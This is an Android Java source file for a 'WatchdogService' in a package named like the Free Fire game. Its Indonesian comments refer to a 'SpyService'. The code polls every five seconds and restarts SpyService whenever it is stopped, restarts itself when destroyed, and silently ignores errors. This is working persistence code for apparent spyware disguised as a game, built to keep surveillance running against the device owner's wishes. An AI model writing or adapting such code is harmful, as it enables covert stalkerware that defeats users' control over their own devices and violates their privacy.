package com.dts.freefireth;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;

public class WatchdogService extends Service {

    private Handler handler;
    private Runnable checker;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startWatchdog();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (handler == null) {
            handler = new Handler(Looper.getMainLooper());
            startWatchdog();
        }
        return START_STICKY;
    }

    private void startWatchdog() {
        checker = new Runnable() {
            @Override
            public void run() {
                try {
                    // Cek apakah SpyService masih jalan
                    boolean isRunning = false;
                    android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                    for (android.app.ActivityManager.RunningServiceInfo info : am.getRunningServices(Integer.MAX_VALUE)) {
                        if (SpyService.class.getName().equals(info.service.getClassName())) {
                            isRunning = true;
                            break;
                        }
                    }

                    if (!isRunning) {
                        // Restart SpyService
                        Intent intent = new Intent(getApplicationContext(), SpyService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(intent);
                        } else {
                            startService(intent);
                        }
                    }
                } catch (Exception ignored) {}
                handler.postDelayed(this, 5000);
            }
        };
        handler.post(checker);
    }

    @Override
    public void onDestroy() {
        if (handler != null && checker != null) {
            handler.removeCallbacks(checker);
        }
        // Restart sendiri
        Intent restart = new Intent(this, WatchdogService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }
}